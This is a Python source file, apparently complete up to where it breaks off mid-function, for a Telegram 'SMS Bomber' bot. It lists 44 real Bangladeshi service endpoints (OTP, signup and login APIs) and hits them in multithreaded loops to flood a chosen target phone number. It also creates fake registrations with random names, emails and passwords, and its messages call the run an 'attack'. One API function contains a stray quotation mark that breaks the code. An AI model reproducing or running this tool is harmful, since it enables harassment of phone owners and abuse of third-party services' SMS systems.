import requests
import random
import string
import threading
import sqlite3
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler, ConversationHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ParseMode
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def init_db():
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  username TEXT, 
                  first_name TEXT, 
                  last_name TEXT, 
                  join_date TEXT, 
                  total_requests INTEGER DEFAULT 0,
                  total_success INTEGER DEFAULT 0)''')
    conn.commit()
    conn.close()

def update_user_stats(user_id, username, first_name, last_name, success_count=0):
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = c.fetchone()
    
    if user:
        c.execute('''UPDATE users 
                    SET username = ?, first_name = ?, last_name = ?,
                    total_requests = total_requests + 1,
                    total_success = total_success + ?
                    WHERE user_id = ?''',
                 (username, first_name, last_name, success_count, user_id))
    else:
        c.execute('''INSERT INTO users 
                    (user_id, username, first_name, last_name, join_date, total_requests, total_success) 
                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                 (user_id, username, first_name, last_name, now, 1, success_count))
    
    conn.commit()
    conn.close()

def get_user_stats(user_id):
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    result = c.fetchone()
    conn.close()
    return result

def get_total_users():
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM users')
    result = c.fetchone()[0]
    conn.close()
    return result

def get_total_requests():
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT SUM(total_requests) FROM users')
    result = c.fetchone()[0] or 0
    conn.close()
    return result


CHANNEL_USERNAME = "@sktunnelvpn"
SUPPORT_USERNAME = "@sktunnelvpnchatbox"
BOT_NAME = "⚡ 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 𝐕1"
DEVELOPER = "@Riyadhossain019"

def send_request_optimized(url, method="POST", headers=None, data=None, json_data=None, params=None, timeout=4):
    
    try:
        
        if headers is None:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
        
        
        timeout = min(timeout, 6)
        
        session = requests.Session()
        
        if method.upper() == "POST":
            if json_data:
                response = session.post(url, headers=headers, json=json_data, timeout=timeout, verify=False, allow_redirects=True)
            elif data:
                response = session.post(url, headers=headers, data=data, timeout=timeout, verify=False, allow_redirects=True)
            else:
                response = session.post(url, headers=headers, timeout=timeout, verify=False, allow_redirects=True)
        else:
            response = session.get(url, headers=headers, params=params, timeout=timeout, verify=False, allow_redirects=True)
        
        if response is not None:
            
            if response.status_code in [200, 201, 202, 204]:
                return True
            
            elif 200 <= response.status_code < 300:
                return True
            
            try:
                response_text = response.text.lower()
                if 'success' in response_text or 'otp' in response_text or 'sent' in response_text:
                    return True
                elif response.status_code == 400 and ('already' in response_text or 'exist' in response_text):
                    return True
            except:
                pass
        
        return False
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        return False
    except Exception:
        return False
    finally:
        try:
            session.close()
        except:
            pass


def generate_random_string(pattern=None, length=12):
    
    if pattern:
        result = ''
        for char in pattern:
            if char == 'n':
                result += str(random.randint(0, 9))
            elif char == 'l':
                result += random.choice(string.ascii_lowercase)
            elif char == 'u':
                result += random.choice(string.ascii_uppercase)
            elif char == 'a':
                result += random.choice(string.ascii_letters)
            elif char == 'd':
                result += random.choice(string.digits)
            elif char == 's':
                result += random.choice(string.ascii_letters + string.digits)
            else:
                result += char
        return result
    else:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_random_email():
    
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "protonmail.com"]
    username = generate_random_string(pattern='llllllnn')
    domain = random.choice(domains)
    return f"{username}@{domain}"

def generate_random_name():
    
    first_names = ["Aulad", "Ridoy", "Hasib", "Sakib", "Rahim", "Karim", "John", "David", "Michael", "Robert"]
    last_names = ["Hosen", "Khan", "Ahmed", "Smith", "Williams", "Brown", "Davis", "Miller", "Wilson", "Taylor"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"




def api_1(number):
    
    try:
        password = generate_random_string(pattern='nnnnnnnnnnnn')
        email = generate_random_email()
        device_id = generate_random_string(length=32)
        name = generate_random_name()
        
        url = "https://core.easy.com.bd/api/v1/registration"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        data = {
            "password": password,
            "password_confirmation": password,
            "device_key": device_id,
            "name": name,
            "mobile": number,
            "email": email
        }
        return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)
    except:
        return False


def api_2(number):
    
    url = "https://training.gov.bd/backoffice/api/user/sendOtp"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"mobile": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_3(number):
    
    url = "https://auth.qcoom.com/api/v1/otp/send"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"mobileNumber": f"+88{number}"}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_4(number):
    
    url = "https://api.apex4u.com/api/auth/login"
    headers = {
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"phoneNumber": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_5(number):
    
    url = "https://api.osudpotro.com/api/v1/users/send_otp"
    headers = {
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"mobile": f"+88-{number}", "deviceToken": "web", "language": "en", "os": "web"}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_6(number):
    
    url = "https://api.busbd.com.bd/api/auth"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"phone": f"+88{number}"}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_7(number):
    "    url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"phone": number, "language": "en", "email": ""}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_8(number):
    
    url = "https://app.deshal.net/api/auth/login"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"phone": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_9(number):
    
    url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"number": f"+88{number}"}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_10(number):
 
    password = generate_random_string(pattern='nnnnnnnnnnnn')
    email = generate_random_email()
    name = generate_random_name()
    
    url = "https://regalfurniturebd.com/api/auth/register"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {
        "emergency_contact_number": number,
        "password_confirmation": password,
        "address": "",
        "address_1": "Dhaka,bd,ch",
        "address_2": "My,won,home",
        "telephone": number,
        "agree": True,
        "device_name": "web_browser",
        "password": password,
        "district": "Outside Dhaka",
        "post_code": "200",
        "name": name,
        "company": "dhaka",
        "email": email
    }
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=4)


def api_11(number):
    
    url = "https://da-api.robi.com.bd/da-nll/otp/send"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"msisdn": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_12(number):
    
    url = "https://api.shikho.com/public/activity/otp"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"phone": number, "intent": "ap-discount-request"}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_13(number):
    
    url = "https://api.garibookadmin.com/api/v3/user/login"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"recaptcha_token": "garibookcaptcha", "mobile": number, "channel": "web"}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_14(number):
    
    url = "https://api.pathao.com/v2/auth/register"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"country_prefix": "880", "national_number": number[1:], "country_id": 1}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_15(number):
    
    url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
    headers = {
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"msisdn": number[1:]}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_16(number):
   
    url = "https://web.hishabee.business/auth"
    headers = {"User-Agent": "Mozilla/5.0"}
    return send_request_optimized(url, "GET", headers, timeout=2)


def api_17(number):
    
    url = "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json"
    headers = {
        "accept": "application/json", 
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0"
    }
    data = {"phoneNbr": number, "email": "", "OTPType": 1, "userName": ""}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_18(number):
    
    url = "https://phonebill.btcl.com.bd/api/bcare/anonym/sendOTP.json"
    headers = {
        "accept": "application/json", 
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0"
    }
    data = {"phoneNbr": number, "email": "", "OTPType": 1, "userName": ""}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_19(number):
    
    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0"
    }
    data = {"number": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_20(number):
    
    url = "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1"
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0"
    }
    data = {"actionType": "otpSend", "mobileNo": number}
    return send_request_optimized(url, "POST", headers, data=data, timeout=3)


def api_21(number):
    
    url = "https://api.bdtickets.com:20100/v1/auth"
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0"
    }
    data = {"createUserCheck": True, "phoneNumber": number, "applicationChannel": "WEB_APP"}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_22(number):
    
    url = "https://api.swap.com.bd/api/v1/send-otp"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "user-agent": "Mozilla/5.0"
    }
    data = {"phone": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_23(number):
    
    url = "https://api.ilyn.global/auth/signup"
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'appcode': 'ilyn-bd',
        'user-agent': 'Mozilla/5.0'
    }
    data = {"phone": {"code": "BD", "number": number}, "provider": "sms"}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_24(number):
    
    url = "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=141.0.0.0&os=Windows&osv=10"
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0'
    }
    data = {"phone": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_25(number):
    
    url = "https://api.mynagad.com/api/user/check-user-status"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"msisdn": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_26(number):
    
    url = "https://cokestudio23.sslwireless.com/api/store-and-send-otp"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    name = generate_random_name()
    email = generate_random_email()
    data = {
        "msisdn": f"880{number}",
        "name": name,
        "email": email,
        "dob": "2000-01-01",
        "occupation": "Student",
        "gender": random.choice(["male", "female"])
    }
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_27(number):
    
    url = "https://cokestudio23.sslwireless.com/api/check-gp-number"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"msisdn": f"880{number}"}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=2)


def api_28(number):
    
    url = "https://weblogin.grameenphone.com/backend/api/v1/otp"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"msisdn": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_29(number):
    
    url = "https://apix.rabbitholebd.com/appv2/login/requestOTP"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"mobile": f"+880{number}"}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_30(number):
    
    url = "https://api.bd.airtel.com/v1/account/login/otp"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"phone_number": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_31(number):
    
    url = "https://api.bd.airtel.com/v1/account/register/otp"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"phone_number": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_32(number):
    
    url = "https://bikroy.com/data/phone_number_login/verifications/phone_login"
    headers = {"User-Agent": "Mozilla/5.0"}
    params = {"phone": number}
    return send_request_optimized(url, "GET", headers, params=params, timeout=2)


def api_33(number):
    
    url = "https://www.rokomari.com/otp/send"
    headers = {"User-Agent": "Mozilla/5.0"}
    params = {"emailOrPhone": f"880{number}", "countryCode": "BD"}
    return send_request_optimized(url, "GET", headers, params=params, timeout=2)


def api_34(number):
    
    url = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp"
    headers = {"User-Agent": "Mozilla/5.0"}
    params = {"mobile": number}
    return send_request_optimized(url, "GET", headers, params=params, timeout=2)


def api_35(number):
    
    url = "https://m.cricbuzz.com/cbplus/auth/user/signup"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"username": generate_random_email()}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_36(number):
    
    url = "https://api.paragonfood.com.bd/auth/customerlogin"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"emailOrPhone": generate_random_email()}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_37(number):
    
    url = "https://prod-api.viewlift.com/identity/signup"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    params = {"site": "prothomalo"}
    data = {
        "requestType": "send",
        "phoneNumber": f"+880{number}",
        "emailConsent": True,
        "whatsappConsent": False
    }
    return send_request_optimized(url, "POST", headers, json_data=data, params=params, timeout=3)


def api_38(number):
    
    url = "https://prod-api.viewlift.com/identity/signup"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    params = {"site": "hoichoitv"}
    data = {
        "requestType": "send",
        "phoneNumber": f"+880{number}",
        "emailConsent": True,
        "whatsappConsent": True
    }
    return send_request_optimized(url, "POST", headers, json_data=data, params=params, timeout=3)


def api_39(number):
    
    url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    name = generate_random_name()
    email = generate_random_email()
    data = {
        "full_name": name,
        "company_name": "Test Company",
        "email_address": email,
        "phone_number": number
    }
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_40(number):
    
    url = "https://app.eonbazar.com/api/auth/register"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    name = generate_random_name()
    email = generate_random_email()
    password = generate_random_string(pattern='nnnnnnnn')
    data = {
        "mobile": number,
        "name": name,
        "password": password,
        "email": email
    }
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_41(number):
    
    url = "https://tracking.sundarbancourierltd.com/PreBooking/SendPin"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"PreBookingRegistrationPhoneNumber": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_42(number):
   
    url = "https://tracking.sundarbancourierltd.com/PreBooking/CheckingUsername"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {"PreBookingRegistrationUsername": number}
    return send_request_optimized(url, "POST", headers, json_data=data, timeout=3)


def api_43(number):
    
    url = "https://www.1024tera.com/wap/outlogin/phoneRegister"
    headers = {"User-Agent": "Mozilla/5.0"}
    params = {
        "selectStatus": "true",
        "redirectUrl": "https://www.1024tera.com/wap/share/filelist"
    }
    return send_request_optimized(url, "GET", headers, params=params, timeout=2)


def api_44(number):
    
    url = "https://ultranetrn.com.br/fonts/api.php"
    headers = {"User-Agent": "Mozilla/5.0"}
    params = {"number": number}
    return send_request_optimized(url, "GET", headers, params=params, timeout=2)


ALL_APIS = [
    api_1, api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_10,
    api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_18, api_19, api_20,
    api_21, api_22, api_23, api_24, api_25, api_26, api_27, api_28, api_29, api_30,
    api_31, api_32, api_33, api_34, api_35, api_36, api_37, api_38, api_39, api_40,
    api_41, api_42, api_43, api_44
]


PHONE, AMOUNT, CONFIRM = range(3)


def get_main_menu_keyboard():
    
    keyboard = [
        [KeyboardButton("🚀 𝐒𝐓𝐀𝐑𝐓 𝐁𝐎𝐌𝐁𝐈𝐍𝐆"), KeyboardButton("📊 𝐌𝐘 𝐒𝐓𝐀𝐓𝐒")],
        [KeyboardButton("👥 𝐓𝐎𝐓𝐀𝐋 𝐔𝐒𝐄𝐑𝐒"), KeyboardButton("⚡ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎")],
        [KeyboardButton("📢 𝐉𝐎𝐈𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋"), KeyboardButton("🆘 𝐒𝐔𝐏𝐏𝐎𝐑𝐓")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_back_keyboard():
    
    keyboard = [[KeyboardButton("🔙 𝐁𝐀𝐂𝐊 𝐓𝐎 𝐌𝐀𝐈𝐍")]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_confirmation_keyboard():
    
    keyboard = [
        [
            InlineKeyboardButton("✅ 𝐂𝐎𝐍𝐅𝐈𝐑𝐌 & 𝐒𝐓𝐀𝐑𝐓", callback_data="confirm_start"),
            InlineKeyboardButton("❌ 𝐂𝐀𝐍𝐂𝐄𝐋", callback_data="cancel_bomb")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)


def execute_bombing_attack(phone, amount, user_id, context):
    
    total_success = 0
    total_apis = len(ALL_APIS)
    
    
    start_msg = context.bot.send_message(
        user_id,
        f"""
🎯 *𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐍𝐈𝐓𝐈𝐀𝐋𝐈𝐙𝐄𝐃*

📱 *Target:* `{phone}`
⚡ *Amount:* `{amount}`
📊 *Total requests:* `{amount * total_apis}`

⏳ *Starting attack sequence...*
        """,
        parse_mode=ParseMode.MARKDOWN
    )
    
    
    progress_msg = context.bot.send_message(
        user_id,
        "🔄 *Initializing APIs... 0%*",
        parse_mode=ParseMode.MARKDOWN
    )
    
    
    for Attack_num in range(amount):
        Attack_success = 0
        
        
        if amount > 1:
            progress = int(((Attack_num) / amount) * 100)
            context.bot.edit_message_text(
                f"🔄 *Attack {Attack_num + 1}/{amount} - {progress}%*",
                chat_id=user_id,
                message_id=progress_msg.message_id,
                parse_mode=ParseMode.MARKDOWN
            )
        
        
        with ThreadPoolExecutor(max_workers=25) as executor:
            
            future_to_api = {executor.submit(api, phone): i for i, api in enumerate(ALL_APIS)}
            
            
            completed = 0
            for future in as_completed(future_to_api):
                completed += 1
                if completed % 3 == 0:  # Update more frequently
                    
                    progress = int((completed / total_apis) * 100)
                    try:
                        context.bot.edit_message_text(
                            f"🔄 *Attack {Attack_num + 1}/{amount} - {progress}%*\n✅ {completed}/{total_apis} APIs",
                            chat_id=user_id,
                            message_id=progress_msg.message_id,
                            parse_mode=ParseMode.MARKDOWN
                        )
                    except:
                        pass
                
                try:
                    if future.result():
                        Attack_success += 1
                except:
                    pass
        
        total_success += Attack_success
        
        
        if amount > 1:
            context.bot.send_message(
                user_id,
                f"""
✅ *𝐀𝐓𝐓𝐀𝐂𝐊 {Attack_num + 1} 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄*

✓ Successful: `{Attack_success}/{total_apis}`
✓ Attack success rate: `{round((Attack_success/total_apis)*100, 1)}%`
✓ Total success: `{total_success}`

🔄 *Preparing next Attack...*
                """,
                parse_mode=ParseMode.MARKDOWN
            )
    
    
    try:
        context.bot.delete_message(user_id, progress_msg.message_id)
    except:
        pass
    
    
    total_attempts = amount * total_apis
    success_rate = round((total_success / total_attempts) * 100, 2) if total_attempts > 0 else 0
    
    
    context.bot.send_message(
        user_id,
        f"""
🎉 *𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘!*

📊 *𝐅𝐈𝐍𝐀𝐋 𝐑𝐄𝐒𝐔𝐋𝐓𝐒:*
━━━━━━━━━━━━━━━━━━━━━━
• 📱 Target Number: `{phone}`
• ⚡ Total Amount: `{amount}`
• ✅ Successful: `{total_success}`
• 📈 Success Rate: `{success_rate}%`

💥 *All APIs have been activated!*

⚡ *Powered by {DEVELOPER}*
        """,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_keyboard()
    )
    
    
    try:
        user_data = context.bot.get_chat(user_id)
        update_user_stats(
            user_id, 
            user_data.username or "", 
            user_data.first_name or "", 
            user_data.last_name or "",
            total_success
        )
    except:
        pass
    
    return total_success


def start_command(update, context):
    """Handle /start command"""
    user = update.effective_user
    
    welcome_text = f"""
✨ *Welcome to {BOT_NAME}!* ✨

👋 *Hello {user.first_name}!* 

I'm a powerful SMS Bomber Bot with *{len(ALL_APIS)} active APIs* that can send sms bombing requests to any Bangladeshi number.

🎯 *𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒:*
━━━━━━━━━━━━━━━━━━━━━━
• ✅ {len(ALL_APIS)} Active APIs
• 📊 Real-time Stats
• 🎯 High Success Rate
• 🔄 Multi-threaded

📝 *𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄:*
━━━━━━━━━━━━━━━━━━━━━━
1. Click *🚀 𝐒𝐓𝐀𝐑𝐓 𝐁𝐎𝐌𝐁𝐈𝐍𝐆*
2. Enter phone number (01XXXXXXXXX)
3. Enter amount (1-100)
4. Confirm and start attack

⚠️ *𝐈𝐌𝐏𝐎𝐑𝐓𝐀𝐍𝐓:*
━━━━━━━━━━━━━━━━━━━━━━
• Use responsibly
• Max 100 Amount per session
• Join our channel for updates

📢 Channel: {CHANNEL_USERNAME}
🆘 Support: {SUPPORT_USERNAME}
👨‍💻 Developer: {DEVELOPER}
    """
    
    update.message.reply_text(
        welcome_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_keyboard()
    )
    
    return ConversationHandler.END

def start_bombing(update, context):
    
    update.message.reply_text(
        """
📱 *𝐄𝐍𝐓𝐄𝐑 𝐏𝐇𝐎𝐍𝐄 𝐍𝐔𝐌𝐁𝐄𝐑*

Please send the target phone number:
• Must be 11 digits

Type /cancel to stop.
        """,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_back_keyboard()
    )
    
    return PHONE

def get_phone_number(update, context):
    
    phone = update.message.text.strip()
    
    # Validate phone number
    if not (phone.startswith('01') and len(phone) == 11 and phone.isdigit()):
        update.message.reply_text(
            """
❌ *𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐏𝐇𝐎𝐍𝐄 𝐍𝐔𝐌𝐁𝐄𝐑!*

Please enter a valid Bangladeshi number:
• Example: `01712345678`

Try again:
            """,
            parse_mode=ParseMode.MARKDOWN
        )
        return PHONE
    
    
    context.user_data['phone'] = phone
    
    update.message.reply_text(
        f"""

🎯 *𝐍𝐎𝐖 𝐄𝐍𝐓𝐄𝐑 𝐀𝐌𝐎𝐔𝐍𝐓*

How many Amount do you want to send?

Type /cancel to stop.
        """,
        parse_mode=ParseMode.MARKDOWN
    )
    
    return AMOUNT

def get_amount(update, context):
    
    try:
        amount = int(update.message.text.strip())
        
        # Validate amount
        if amount < 1 or amount > 100:
            update.message.reply_text(
                f"""
❌ *𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐀𝐌𝐎𝐔𝐍𝐓!*

Please enter a number between 1 and 100:
• Maximum: 100 Amount
• Each Attack = {len(ALL_APIS)} API requests

Try again:
                """,
                parse_mode=ParseMode.MARKDOWN
            )
            return AMOUNT
        
        
        context.user_data['amount'] = amount
        phone = context.user_data['phone']
        
        
        total_requests = amount * len(ALL_APIS)
        
        confirm_text = f"""
🎯 *𝐂𝐎𝐍𝐅𝐈𝐑𝐌 𝐀𝐓𝐓𝐀𝐂𝐊*

📱 *Target Number:* `{phone}`
⚡ *Amount:* `{amount}`
⏱ *Attack time:* `{amount * 2} seconds`

⚠️ *This will send {total_requests} SMS requests!*

Please confirm to start the attack:
        """
        
        update.message.reply_text(
            confirm_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_confirmation_keyboard()
        )
        
        return CONFIRM
        
    except ValueError:
        update.message.reply_text(
            """
❌ *𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐈𝐍𝐏𝐔𝐓!*

Please enter a valid number (1-100):


Try again:
            """,
            parse_mode=ParseMode.MARKDOWN
        )
        return AMOUNT

def cancel(update, context):
    
    update.message.reply_text(
        "❌ Operation cancelled.",
        reply_markup=get_main_menu_keyboard()
    )
    return ConversationHandler.END

def button_handler(update, context):
    
    query = update.callback_query
    query.answer()
    
    if query.data == "confirm_start":
        
        phone = context.user_data.get('phone')
        amount = context.user_data.get('amount')
        
        if not phone or not amount:
            query.edit_message_text("❌ Error: Data not found. Please start again.")
            return ConversationHandler.END
        
        
        query.edit_message_text(
            f"""
⚡ *𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!*

📱 Target: `{phone}`
🎯 Amount: `{amount}`

⏳ Please wait attack start...
            """,
            parse_mode=ParseMode.MARKDOWN
        )
        
        
        def run_attack():
            execute_bombing_attack(phone, amount, query.message.chat_id, context)
        
        threading.Thread(target=run_attack).start()
        
        return ConversationHandler.END
    
    elif query.data == "cancel_bomb":
        query.edit_message_text(
            "❌ Attack cancelled. No requests were sent.",
            reply_markup=get_main_menu_keyboard()
        )
        return ConversationHandler.END

def my_stats_command(update, context):
    
    user = update.effective_user
    stats = get_user_stats(user.id)
    
    if stats:
        user_id, username, first_name, last_name, join_date, total_requests, total_success = stats
        
        
        success_rate = round((total_success / total_requests * 100), 2) if total_requests > 0 else 0
        
        stats_text = f"""
📊 *𝐘𝐎𝐔𝐑 𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐂𝐒*

👤 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎:*
━━━━━━━━━━━━━━━━━━━━━━
• 🆔 User ID: `{user_id}`
• 👤 Name: {first_name} {last_name or ''}
• 📛 Username: @{username or 'Not set'}

📈 *𝐔𝐒𝐀𝐆𝐄 𝐒𝐓𝐀𝐓𝐒:*
━━━━━━━━━━━━━━━━━━━━━━
• 📅 Join Date: {join_date}
• 📤 Total Requests: `{total_requests}`
• ✅ Successful: `{total_success}`
• 📊 Success Rate: `{success_rate}%`
• 🎯 Status: 🟢 𝐀𝐂𝐓𝐈𝐕𝐄

💪 Keep using our service!
        """
    else:
        stats_text = f"""
📊 *𝐘𝐎𝐔𝐑 𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐂𝐒*

No statistics found yet!
Start using the bot to see your stats.

Click *🚀 𝐒𝐓𝐀𝐑𝐓 𝐁𝐎𝐌𝐁𝐈𝐍𝐆* to begin!
        """
    
    update.message.reply_text(
        stats_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_keyboard()
    )

def total_users_command(update, context):
    
    total_users_count = get_total_users()
    total_requests_count = get_total_requests()
    
    users_text = f"""
